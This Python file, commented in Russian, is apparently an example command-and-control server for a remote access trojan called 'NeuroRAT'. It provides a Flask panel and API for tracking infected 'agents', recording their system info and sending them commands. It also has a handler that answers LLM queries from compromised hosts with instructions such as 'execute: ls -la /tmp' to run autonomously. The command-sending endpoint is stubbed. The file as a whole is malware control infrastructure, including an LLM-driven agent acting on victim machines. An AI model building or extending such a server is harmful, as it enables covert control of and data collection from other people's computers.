#!/usr/bin/env python3
"""
Пример сервера управления для NeuroRAT.
"""

import os
import sys
import time
import json
import logging
import threading
import argparse
from flask import Flask, request, jsonify, render_template, redirect, url_for

# Добавляем корневую директорию проекта в PYTHONPATH
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from agent_protocol.server.server import AgentServer
from agent_protocol.shared.protocol import CommandType

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('neurorat_server')

# Инициализация Flask
app = Flask(__name__, template_folder="templates")

# Глобальный объект сервера
agent_server = None

# Данные агентов
agents_data = {}

@app.route('/')
def index():
    """Главная страница."""
    return render_template('index.html', agents=agents_data)

@app.route('/agents')
def agents():
    """Страница со списком агентов."""
    return render_template('agents.html', agents=agents_data)

@app.route('/agent/<agent_id>')
def agent_details(agent_id):
    """Страница с деталями агента."""
    if agent_id not in agents_data:
        return redirect(url_for('agents'))
    
    return render_template('agent_details.html', agent=agents_data[agent_id])

@app.route('/api/agents', methods=['GET'])
def api_agents():
    """API для получения списка агентов."""
    return jsonify(list(agents_data.keys()))

@app.route('/api/agent/<agent_id>', methods=['GET'])
def api_agent_details(agent_id):
    """API для получения деталей агента."""
    if agent_id not in agents_data:
        return jsonify({"error": "Agent not found"}), 404
    
    return jsonify(agents_data[agent_id])

@app.route('/api/agent/<agent_id>/command', methods=['POST'])
def api_send_command(agent_id):
    """API для отправки команды агенту."""
    if agent_id not in agents_data:
        return jsonify({"error": "Agent not found"}), 404
    
    data = request.json
    if not data or "command_type" not in data:
        return jsonify({"error": "Invalid command format"}), 400
    
    # Обновляем временную метку последней активности
    agents_data[agent_id]["last_active"] = time.time()
    
    # Создаем команду
    command_type = data["command_type"]
    command_data = data.get("data", {})
    
    # Отправляем команду через API сервера агента
    # (В реальном сценарии это было бы реальное HTTP API вызов)
    return jsonify({"success": True, "message": f"Command {command_type} sent to {agent_id}"})

def handle_status(command):
    """Обработчик команды статуса."""
    # Получаем или создаем данные агента
    agent_id = command.agent_id
    if agent_id not in agents_data:
        agents_data[agent_id] = {
            "agent_id": agent_id,
            "first_seen": time.time(),
            "last_active": time.time(),
            "system_info": {},
            "commands": []
        }
    else:
        agents_data[agent_id]["last_active"] = time.time()
    
    # Обновляем информацию о системе, если она предоставлена
    if "system_info" in command.data:
        agents_data[agent_id]["system_info"] = command.data["system_info"]
    
    # Возвращаем ответ
    return {
        "command_id": command.command_id,
        "success": True,
        "data": {
            "server_time": time.time(),
            "server_status": "running"
        }
    }

def handle_llm_query(command):
    """Обработчик команды LLM-запроса."""
    # Получаем или создаем данные агента
    agent_id = command.agent_id
    if agent_id not in agents_data:
        agents_data[agent_id] = {
            "agent_id": agent_id,
            "first_seen": time.time(),
            "last_active": time.time(),
            "system_info": {},
            "commands": []
        }
    else:
        agents_data[agent_id]["last_active"] = time.time()
    
    # Сохраняем команду в истории
    agents_data[agent_id]["commands"].append({
        "time": time.time(),
        "command_type": "llm_query",
        "data": command.data
    })
    
    # Возвращаем ответ с командами для выполнения
    return {
        "command_id": command.command_id,
        "success": True,
        "data": {
            "query": "collect_info: system\n\nexecute: ls -la /tmp",
            "autonomous": True,
            "context": {
                "server_time": time.time()
            }
        }
    }

def start_server(host, port, auth_required=False, auth_token=None):
    """Запуск сервера агентов."""
    global agent_server
    
    # Создаем сервер
    agent_server = AgentServer(
        host=host,
        port=port,
        auth_required=auth_required,
        auth_token=auth_token
    )
    
    # Регистрируем обработчики команд
    agent_server.register_command_handler(CommandType.STATUS, handle_status)
    agent_server.register_command_handler(CommandType.LLM_QUERY, handle_llm_query)
    
    # Запускаем сервер
    server_thread = agent_server.start()
    logger.info(f"Agent server started on {host}:{port}")
    
    return server_thread

def main():
    """Основная функция."""
    # Создаем парсер аргументов командной строки
    parser = argparse.ArgumentParser(description="NeuroRAT C2 Server")
    parser.add_argument("--host", default="0.0.0.0", help="Host to bind")
    parser.add_argument("--port", type=int, default=8000, help="Agent server port")
    parser.add_argument("--web-port", type=int, default=5000, help="Web UI port")
    parser.add_argument("--auth", action="store_true", help="Enable authentication")
    parser.add_argument("--token", help="Authentication token")
    
    args = parser.parse_args()
    
    # Запускаем сервер агентов
    server_thread = start_server(
        host=args.host,
        port=args.port,
        auth_required=args.auth,
        auth_token=args.token
    )
    
    # Запускаем веб-интерфейс
    app.run(host=args.host, port=args.web_port, debug=True, use_reloader=False)
    
    # Ожидаем завершения сервера
    server_thread.join()

if __name__ == "__main__":
    main() 